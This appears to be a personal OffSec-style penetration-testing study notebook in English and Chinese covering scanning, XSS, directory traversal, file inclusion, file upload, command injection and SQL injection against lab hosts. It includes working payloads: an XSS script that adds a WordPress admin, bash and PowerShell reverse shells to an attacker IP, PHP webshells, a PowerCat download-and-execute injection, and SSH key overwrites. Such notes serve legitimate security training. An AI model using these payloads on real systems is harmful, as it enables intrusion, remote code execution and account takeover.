    - [Scan Templates](https://docs.tenable.com/nessus/Content/ScanAndPolicyTemplates.htm): Discovery, Vulnerabilities, and Compliance.
    - Vulnerabilities
        - Basic Network Scan:  full scan with the majority of settings predefined
        - Advanced Scan: without any predefined settings, fully customize our vulnerability scan
        - Advanced Dynamic Scan:  configure a [dynamic plugin filter](https://docs.tenable.com/nessus/Content/DynamicPlugins.htm) instead

    Nessus Plugins are programs written in the Nessus Attack Scripting Language (NASL).

>[!Note]
> ![image](https://hackmd.io/_uploads/SyQ4_lcbJx.png)

## Nmap - NSE Vulnerability Scripts
>[!Tip]
> NSE scripts are grouped into categories around cases such as vulnerability detection, brute forcing, and network discovery. The scripts can also extend the version detection and information-gathering capabilities of Nmap.

```
$ pwd
/usr/local/Cellar/nmap/7.95/share/nmap
$ ls scripts/
acarsd-info.nse				http-huawei-hg5xx-vuln.nse		ntp-info.nse
address-info.nse			http-icloud-findmyiphone.nse		ntp-monlist.nse
afp-brute.nse				http-icloud-sendmsg.nse			omp2-brute.nse
afp-ls.nse				http-iis-short-name-brute.nse		omp2-enum-targets.nse
afp-path-vuln.nse			http-iis-webdav-vuln.nse		omron-info.nse
afp-serverinfo.nse			http-internal-ip-disclosure.nse		openflow-info.nse
afp-showmount.nse			http-joomla-brute.nse			openlookup-info.nse
ajp-auth.nse				http-jsonp-detection.nse		openvas-otp-brute.nse
ajp-brute.nse				http-litespeed-sourcecode-download.nse	openwebnet-discovery.nse
...
```
- [NSE Scripts document](https://nmap.org/nsedoc/scripts/)
```
┌──(chw㉿CHW-kali)-[/]
└─$ sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org )
...
PORT    STATE SERVICE VERSION
443/tcp open  http    Apache httpd 2.4.49 ((Unix))
...
| vulners: 
|   cpe:/a:apache:http_server:2.4.49:
...
        https://vulners.com/githubexploit/DF57E8F1-FE21-5EB9-8FC7-5F2EA267B09D	*EXPLOIT*
|     	CVE-2021-41773	4.3	https://vulners.com/cve/CVE-2021-41773
...
|_http-server-header: Apache/2.4.49 (Unix)
MAC Address: 00:0C:29:C7:81:EA (VMware)
```
```
┌──(chw㉿CHW-kali)-[/]
└─$ sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.50.124
Starting Nmap 7.92 ( https://nmap.org )
Host is up (0.00069s latency).

PORT    STATE SERVICE VERSION
443/tcp open  http    Apache httpd 2.4.49 ((Unix))
| http-vuln-cve2021-41773:
|   VULNERABLE:
|   Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49
|     State: VULNERABLE
|               A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by "require all denied" these requests can succeed. Additionally this flaw could leak the source of interpreted files like CGI scripts. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions.
|           
|     Disclosure date: 2021-10-05
|     Check results:
|       
|         Verify arbitrary file read: https://192.168.50.124:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
...
Nmap done: 1 IP address (1 host up) scanned in 6.86 seconds
```
# Web Application Assessment

## Directory Brute Force
- dirb
```
./dirb {Target URL} /usr/local/share/dirb/wordlists/common.txt
```
- dirsearch
```
python3 dirsearch.py -u {Target URL} 
```
- Gobuster (dir mode)
```
$ gobuster dir -u 192.168.50.20 -w /usr/local/share/dirb/wordlists/common.txt -t 5
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.20
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/30 05:16:21 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://192.168.50.20/css/]
/db                   (Status: 301) [Size: 311] [--> http://192.168.50.20/db/]
/images               (Status: 301) [Size: 315] [--> http://192.168.50.20/images/]
/index.php            (Status: 302) [Size: 0] [--> ./login.php]
/js                   (Status: 301) [Size: 311] [--> http://192.168.50.20/js/]
/server-status        (Status: 403) [Size: 278]
/uploads              (Status: 301) [Size: 316] [--> http://192.168.50.20/uploads/]

===============================================================
2022/03/30 05:18:08 Finished
===============================================================
```
`-t`: number of concurrent threads to use when making requests
    
- Gobuster (API endpoints)
```
┌──(chw㉿CHW-kali)-[/]
└─$ gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.16:5001
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Patterns:                pattern (1 entries)
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/06 04:19:46 Starting gobuster in directory enumeration mode
===============================================================
/books/v1             (Status: 200) [Size: 235]
/console              (Status: 200) [Size: 1985]
/ui                   (Status: 308) [Size: 265] [--> http://192.168.50.16:5001/ui/]
/users/v1             (Status: 200) [Size: 241]
```
`-p`: Proxy address
    
- Gobuster (dns mode)
```
$ gobuster -d example.com -w /usr/local/share/dirb/wordlists/common.txt -t 5
```

## HTTP headers
>[!Note]
> Historically, headers that **started with "X-" were called non-standard HTTP headers**. However, RFC66483 now deprecates the use of "X-" in favor of a clearer naming convention.
The names or values in the response header often reveal additional information about the technology stack used by the application. Some examples of non-standard headers include `X-Powered-By`, `x-amz-cf-id`, and `X-Aspnet-Version`. Further research into these names could reveal additional information, such as that the "`x-amz-cf-id`" header indicates the application uses Amazon CloudFront.

# Cross-Site Scripting
- Reflected XSS
Include the payload in a crafted request or link
- Stored (Persistent) XSS
The exploit payload is stored in a database or otherwise cached by a server
- DOM-based XSS (Document Object Model)
DOM-based XSS can be stored or reflected; the key is that DOM-based XSS attacks occur when a browser parses the page's content and inserted JavaScript is executed.
## Identifying XSS Vulnerabilities
The useragent record value is retrieved from the database and inserted plainly in the Table Data (td) HTML tag, without any sort of data sanitization.\
![image](https://hackmd.io/_uploads/SJrHOKEzye.png)
![image](https://hackmd.io/_uploads/ByzduFEzkg.png)

## Privilege Escalation via XSS
- `Secure flag`: instructs the browser to only send the cookie over encrypted connections, such as HTTPS. This protects the cookie from being sent in clear text and captured over the network.
- `HttpOnly flag`: instructs the browser to deny JavaScript access to the cookie. If this flag is not set, we can use an XSS payload to steal the cookie.

1. Gathering WordPress Nonce
```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```
    
2. Creating a New WordPress Administrator Account
```javascript
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

3. Minifying the attack code into a one-liner,
- [JSCompress](https://jscompress.com/)
![image](https://hackmd.io/_uploads/HJBGk9Vfyx.png)

4. Encode the minified JavaScript code
- JS Encoding JS Function
```JavaScript
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

![image](https://hackmd.io/_uploads/rkEmg5NM1g.png)
Run the function from the browser's console to Unicode.

5. Launching the Final XSS Attack through Curl
![image](https://hackmd.io/_uploads/BkmsWc4Gyg.png)

![image](https://hackmd.io/_uploads/SylsBqVfyl.png)

# Web Application Attacks
## Directory Traversal
- Absolute vs Relative Paths
- Identifying and Exploiting Directory Traversals
```
http://mountaindesserts.com/meteor/index.php?page=admin.php
```
> 1. index.php tells us the web application uses PHP
> 2. URL contains a directory called meteor (subdirectory of the web root.)
> 3. PHP uses `$_GET` to manage variables via a GET request
```
TRY
http://mountaindesserts.com/meteor/index.php?
1. page=../../../../../../../../../etc/passwd
2. page=../../../../../../../../../home/offsec/.ssh/id_rsa
```
When we get the SSH private key, use the private key to connect to the target system via SSH on port 2222.\
Private key file: *dt_key*
```
┌──(chw㉿CHW-kali)-[/]
└─$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
The authenticity of host '[mountaindesserts.com]:2222 ([192.168.50.16]:2222)' can't be established.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for '/home/kali/dt_key' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
...

┌──(chw㉿CHW-kali)-[/]
└─$ chmod 400 dt_key

┌──(chw㉿CHW-kali)-[/]
└─$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
...
offsec@68b68f3eb343:~$ 
```
>[!Important]
> Windows directory traversal\
> `C:\Windows\System32\drivers\etc\hosts`\
> Log:\
> `C:\inetpub\logs\LogFiles\W3SVC1\.`\
> IIS web server:\
> `C:\inetpub\wwwroot\web.config`

## File Inclusion Vulnerabilities
> 1. How to exploit a Local File Inclusion (LFI) vulnerability\
> 2. Analyze the differences between File Inclusion and Directory Traversal vulnerabilities

### 1. Local File Inclusion (LFI)
>[!Caution]
> - `Directory traversal`
> only allows us to read the contents of a file    
> - `File inclusion`
> we can use file inclusion vulnerabilities to execute local or remote files, can also display the file contents of non-executable files.
>
> Goal: **obtain Remote Code Execution (RCE) via an LFI vulnerability**  

#### Case study: Executable code to Apache's access.log file in the /var/log/apache2/ directory
##### (1) review what information is controlled by us and saved by Apache in the related log
Log entry of Apache's access.log
```
┌──(chw㉿CHW-kali)-[/]
└─$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
...
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
...
```
> User Agent is included in the log entry
>> Modify the User Agent in Burp and specify what will be written to the access.log file
    
##### (2) modify the User Agent to include the PHP code snippet of the following listing
![image](https://hackmd.io/_uploads/HJaO4Fuzyl.png)

##### (3) enter a command for the PHP snippet & remove the User Agent line
![image](https://hackmd.io/_uploads/rJJ0rY_zkx.png)
> executed ps command that was written to the access.log 

##### (4) **get a reverse shell or add our SSH key to the authorized_keys file for a user**
- Bash TCP reverse shell one-liner:
```
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
```
>[!Important]
> Since we'll execute our command through the `PHP system function`, we should be aware that the command may be executed via the `Bourne Shell (sh)`.    
- sh rather than Bash
```
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```
![image](https://hackmd.io/_uploads/rJWddFuGkg.png)
![image](https://hackmd.io/_uploads/B1osOKuf1e.png)

- URL encoded Bash TCP reverse shell one-liner
```
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```
##### (5) netcat listener & send request
- send request\
![image](https://hackmd.io/_uploads/B1_QFYuzJl.png)

- netcat listener
```
┌──(chw㉿CHW-kali)-[/]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.3] from (UNKNOWN) [192.168.50.16] 57848
bash: cannot set terminal process group (24): Inappropriate ioctl for device
bash: no job control in this shell
www-data@fbea640f9802:/var/www/html/meteor$ ls
admin.php
bavarian.php
css
fonts
img
index.php
js
```
####  Log Poisoning on Windows
XAMPP:\
Apache logs: `C:\xampp\apache\logs\`

>[!Note]
>LFI and RFI vulnerabilities:\
>other frameworks or server-side scripting languages including `Perl`, `Active Server Pages Extended`, `Active Server Pages`, and `Java Server Pages`.

>[!Important]
> 1. LFI vulnerability in a `JSP web application`
> 2. LFI vulnerabilities in modern back-end JavaScript runtime environments like `Node.js`.

### 2. PHP Wrappers
#### **php://filter**
Display the contents of files either with or without encodings like ROT13 or Base64.
```
┌──(chw㉿CHW-kali)-[/]
└─$ curl http://mountaindesserts.com/meteor/index.php?page=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance.

┌──(chw㉿CHW-kali)-[/]
└─$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
...
```
>[!Note]
> `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php`: notice that the <body> tag is not closed at the end of the HTML code. We can assume that something is missing.
#### **data://**
Use the data:// wrapper to achieve code execution.This wrapper is used to embed data elements as **plaintext** or **base64-encoded** data in the running web application's code. 
```
┌──(chw㉿CHW-kali)-[/]
└─$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
admin.php
bavarian.php
css
fonts
img
index.php
js
...
```
> add data:// followed by the data type and content.

Bypass WAF, we can try to use the data:// wrapper with base64-encoded data.
```
┌──(chw㉿CHW-kali)-[/]
└─$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```
> (Base64 decode) PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
> <?php echo system($_GET["cmd"]);?>

>[!Tip]
> `data://` wrapper will not work in a default PHP installation. To exploit it, the **[allow_url_include](https://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-include)** setting needs to be `enabled`.\
> 新版 php 預設都是 Off

### 3. Remote File Inclusion (RFI)
RFI vulnerabilities allow us to include files from a remote system over HTTP or SMB.\
Kali Linux includes several PHP webshells in the `/usr/share/webshells/php/` directory that can be used for RFI.
```
┌──(chw㉿CHW-kali)-[/usr/share/webshells/php/]
└─$ cat simple-backdoor.php
...
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
...
```
```
┌──(chw㉿CHW-kali)-[/usr/share/webshells/php/]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

┌──(chw㉿CHW-kali)-[/usr/share/webshells/php/]
└─$ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) --> 

<pre>admin.php
bavarian.php
css
fonts
img
index.php
js
</pre> 
```

## File Upload Vulnerabilities
File Upload vulnerabilities into three categories:
- Upload files that are executable by the web application
> upload a PHP script
- Combine the file upload mechanism with another vulnerability, such as Directory Traversal
> If the web application is vulnerable to Directory Traversal, we can use a relative path in the file upload request and try to overwrite files like authorized_keys. Furthermore, we can also combine file upload mechanisms with XML External Entity (XXE) or Cross Site Scripting (XSS) attacks.
- Relies on user interaction
> When we discover an upload form for job applications, we can try to upload a CV in .docx4 format with malicious macros5 integrated.

### 1. Using Executable Files
Bypass:\
(1) PHP file extension2 such as `.phps` or `.php7`.\
(2) changing characters in the file extension to `upper case`\
(3) [HackTriacks: File Upload General Methodology](https://book.hacktricks.xyz/pentesting-web/file-upload)
 
>[!Note]
> PowerShell 中實現了一個簡單的 Reverse Shell\
> **encoded reverse shell one-liner**
> ```
> ┌──(chw㉿CHW-kali)-[/]
> └─$ pwsh
>PowerShell 7.1.3
>Copyright (c) Microsoft Corporation.
>
>https://aka.ms/powershell
>Type 'help' to get help.
>
>PS> $Text = '$client = New-Object >System.Net.Sockets.TCPClient("192.168.1>19.3",4444);$stream = $client.GetStream();[byte[]]$bytes = >0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) >-ne 0){;$data = (New-Object -TypeName >System.Text.ASCIIEncoding).GetString($b>ytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
>
>
>PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
>
>PS> $EncodedText =[Convert]::ToBase64String($Bytes)
>
>PS> $EncodedText
>JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
>...
>AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHU>AcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
>
>
>PS> exit
> ```

![image](https://hackmd.io/_uploads/HJPAlhhGyg.png)
![image](https://hackmd.io/_uploads/rkrbWnhfkg.png)

以上為了製造 Windows 環境的 PowerShell payload。
    
```
┌──(chw㉿CHW-kali)-[/]
└─$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

┌──(chw㉿CHW-kali)-[/]
└─$ curl  nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50603
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.50.189
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254

PS C:\xampp\htdocs\meteor\uploads> whoami
nt authority\system
```
**Kali already offers web shells:** `asp`, `aspx`, `cfm`, `jsp`, `laudanum`, `perl`, `php` etc

>[!Tip]
> uploading a file with an innocent file type like `.txt`, then changing the file back to the original file type of the web shell by renaming it.

### 2. Using Non-Executable Files
the web server is no longer using PHP. Let's try to upload a text file.\
modifying the "filename" parameter in the request `../../../../../../../test.txt`
![image](https://hackmd.io/_uploads/Bkg6msaMJx.png)
> we have no way of knowing if the relative path was used for placing the file. \
> (Try to **blindly overwrite files**)

>[!Note]
> web server accounts and permissions:\
> Linux: `www-data`\
> Windows: IIS runs as a `Network Service account` (passwordless built-in Windows identity with low privileges)
>> Starting with IIS version 7.5, Microsoft introduced the `IIS Application Pool Identities`. These are virtual accounts running web applications grouped by application pools. Each application pool has its own pool identity, making it possible to set more precise permissions for accounts running web applications.

**Try to overwrite the authorized_key**: access the system via SSH as the root user.
```
┌──(chw㉿CHW-kali)-[/]
└─$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in fileup
Your public key has been saved in fileup.pub
...

┌──(chw㉿CHW-kali)-[/]
└─$ cat fileup.pub > authorized_keys
```
![image](https://hackmd.io/_uploads/S1vc2ipGJl.png)
Let's try to connect to the system.\
SSH will throw an error because cannot verify the host key. To avoid this error, we'll delete the known_hosts file before we connect to the system.
```
┌──(chw㉿CHW-kali)-[/]
└─$ rm ~/.ssh/known_hosts

┌──(chw㉿CHW-kali)-[/]
└─$ ssh -p 2222 -i fileup root@mountaindesserts.com
The authenticity of host '[mountaindesserts.com]:2222 ([192.168.50.16]:2222)' can't be established.
ED25519 key fingerprint is SHA256:R2JQNI3WJqpEehY2Iv9QdlMAoeB3jnPvjJqqfDZ3IXU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
root@76b77a6eae51:~#
```

## Command Injection
(1) 檢查 Web Application 送出的 parameter
![image](https://hackmd.io/_uploads/B1slrTTfke.png)
> Archive=git+clone+...exploit.db

(2) POST 嘗試可執行的指令
```
┌──(chw㉿CHW-kali)-[/]
└─$ curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive

Command Injection detected. Aborting...%!(EXTRA string=ipconfig) 

┌──(chw㉿CHW-kali)-[/]
└─$ curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive

An error occured with execution: exit status 1 and usage: git [--version] [--help] [-C <path>] [-c <name>=<value>]
           [--exec-path[=<path>]] [--html-path] [--man-path] [--info-path]
           [-p | --paginate | -P | --no-pager] [--no-replace-objects] [--bare]
...
   push      Update remote refs along with associated objects

'git help -a' and 'git help -g' list available subcommands and some
concept guides. See 'git help <command>' or 'git help <concept>'
to read about a specific subcommand or concept.
See 'git help git' for an overview of the system.
```
> git clone 的功能。
> ipconfig 會被偵測到, 但可以單一執行 git

```
┌──(chw㉿CHW-kali)-[/]
└─$ curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive

...
'git help -a' and 'git help -g' list available subcommands and some
concept guides. See 'git help <command>' or 'git help <concept>'
to read about a specific subcommand or concept.
See 'git help git' for an overview of the system.

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.50.189
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254
```
> 確定可以執行 cmdi, 建立 Reverse shell

### PowerShell or CMD reverse shell
#### 1.  Code Snippet to check where our code is executed
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
```
┌──(chw㉿CHW-kali)-[/]
└─$ curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive

...
See 'git help git' for an overview of the system.
PowerShell
```
>  (Base64 decode)\
>  git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell \
>  ``git;(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell``

#### 2. use **Powercat** to create a reverse shel
>[!Note]
> [Powercat source code](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1)            

```
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
```
>[!Tip]
> download `PowerCat` and execute a reverse shell

```
┌──(chw㉿CHW-kali)-[/]
└─$ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
```
> (Base64 decode)\
> git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell\
> `git;IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell`
```
┌──(chw㉿CHW-kali)-[/]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.50.189 - - [05/Apr/2022 09:05:48] "GET /powercat.ps1 HTTP/1.1" 200 -
```
> GET request for powercat.ps1
```
┌──(chw㉿CHW-kali)-[/]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50325
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\Documents\meteor>
```

## SQL Injection
It is currently ranked third among [OWASP's Top 10](https://owasp.org/www-project-top-ten/) Application Security Risks. It is listed as: [A03:2021-Injection](https://owasp.org/Top10/A03_2021-Injection/)
- SQL Theory Refresher
    - SQL can be employed to `query`, `insert`, `modify`, or even `delete data`, and, in some cases, `execute operating system commands`.
    -  Several different frameworks can be used to construct a backend application, written in various languages including `PHP`, `Java`, and `Python`.
    - `MySQL`, `Microsoft SQL Server`, `PostgreSQL`, and `Oracle` are the most popular database implementations
    - SQL Query Embedded in PHP Login Source Code
        ```php
        <?php
            $uname = $_POST['uname'];
            $passwd =$_POST['password'];

            $sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
            $result = mysqli_query($con, $sql_query);
        ?>
        ```
        > SELECT * FROM users WHERE user_name= chw'+!@#$.
- DB Types and Characteristics
    - MySQL\
    along with MariaDB, an open-source fork of MySQL.
    ```
    ┌──(chw㉿CHW-kali)-[/]
    └─$ mysql -u root -p'root' -h  192.168.50.16 -P 3306
    
    Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

    Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

    MySQL [(none)]> select version();
    +-----------+
    | version() |
    +-----------+
    | 8.0.21    |
    +-----------+
    1 row in set (0.107 sec)
    
    MySQL [(none)]> select system_user();
    +--------------------+
    | system_user()      |
    +--------------------+
    | root@192.168.20.50 |
    +--------------------+
    1 row in set (0.104 sec)
    ```
    filter using a `SELECT` statement for the user and authentication_string value belonging to the user table. Next, we'll filter all the results via a `WHERE` clause that matches only the offsec user.
    ```
    MySQL [mysql]> SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
    +--------+------------------------------------------------------------------------+
    | user   | authentication_string                                                  |
    +--------+------------------------------------------------------------------------+
    | offsec | $A$005$?    qvorPp8#lTKH1j54xuw4C5VsXe5IAa1cFUYdQMiBxQVEzZG9XWd/e6     |
    +--------+------------------------------------------------------------------------+
    1 row in set (0.106 sec)
    ```
    > [SHA-2 Pluggable Authentication](https://dev.mysql.com/doc/refman/8.0/en/caching-sha2-pluggable-authentication.html)\
    > 確認 caching_sha2_password 的雜湊格式，通常是基於 SHA-256。使用 `hashcat` 或 `John the Ripper`爆破。\ 
    >`hashcat -m 7400 -a 0 hash.txt wordlist.txt`
    - Microsoft SQL Server (MSSQL)\
    database management system that natively integrates into the Windows ecosystem: [SQLCMD](https://learn.microsoft.com/en-us/sql/tools/sqlcmd/sqlcmd-utility?view=sql-server-ver16&tabs=go%2Cwindows&pivots=cs1-bash)
    >[!Note]
    > 1. [Tabular Data Stream (TDS)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tds/893fcc7e-8a39-4b3c-815a-773b7b982c50): Microsoft SQL Server 和 Sybase Adaptive Server 開發的應用層通訊協議
    > 2. impacket-mssqlclient: Impacket 工具中專門用於與 Microsoft SQL Server 進行互動的 command 工具。利用 Tabular Data Stream (TDS) 協議進行通訊
    ```
    ┌──(chw㉿CHW-kali)-[/]
    └─$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
    Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
    
    [*] Encryption required, switching to TLS
    [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
    [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
    [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
    [*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
    [*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
    [*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
    [!] Press help for extra shell commands
    
    SQL (SQLPLAYGROUND\Administrator  dbo@master)> SELECT name FROM sys.databases;
    name
    ...
    master
    
    tempdb
    
    model
    
    msdb
    
    offsec
    
    SQL>
    ```
    > `master`, `tempdb`, `model`, and `msdb` are default databases

### Manual SQL Exploitation
How to identify and exploit SQL injection vulnerabilities
#### - Error-based Payloads
```php=
<?php
$uname = $_POST['uname'];
